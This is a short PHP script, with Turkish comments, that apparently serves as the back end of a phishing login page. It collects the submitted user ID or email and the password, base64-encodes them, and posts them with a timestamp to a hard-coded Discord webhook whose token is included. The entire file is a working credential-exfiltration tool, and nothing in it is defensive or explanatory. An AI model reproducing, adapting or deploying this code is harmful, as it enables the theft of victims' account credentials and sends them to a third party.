<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $uid = htmlspecialchars($_POST['uid']);
    $password = htmlspecialchars($_POST['password']);
    $timestamp = date("Y-m-d H:i:s");

    // Webhook URL
    $webhook_url = "https://discord.com/api/webhooks/1312615482695880724/ugYpr_SEB8KLN5GXO_ZzBDJbA7oEGSLSLWOx4tHn0zwPB5zkwhlBcXYthxc08kdK6cdk";

    // Veriyi şifreleme
    $encrypted_uid = base64_encode($uid);
    $encrypted_password = base64_encode($password);

    // Webhook verisi
    $data = [
        "content" => "**New Login Detected**",
        "embeds" => [
            [
                "title" => "Login Details",
                "fields" => [
                    ["name" => "UID/Email", "value" => $encrypted_uid, "inline" => true],
                    ["name" => "Password", "value" => $encrypted_password, "inline" => true],
                    ["name" => "Timestamp", "value" => $timestamp, "inline" => true]
                ],
                "color" => 16776960
            ]
        ]
    ];

    // JSON formatında POST isteği
    $options = [
        'http' => [
            'header' => "Content-Type: application/json\r\n",
            'method' => 'POST',
            'content' => json_encode($data),
        ]
    ];
    $context = stream_context_create($options);
    $result = file_get_contents($webhook_url, false, $context);

    if ($result === FALSE) {
        die('Error sending data.');
    }

    echo "Login data sent successfully!";
}
?>
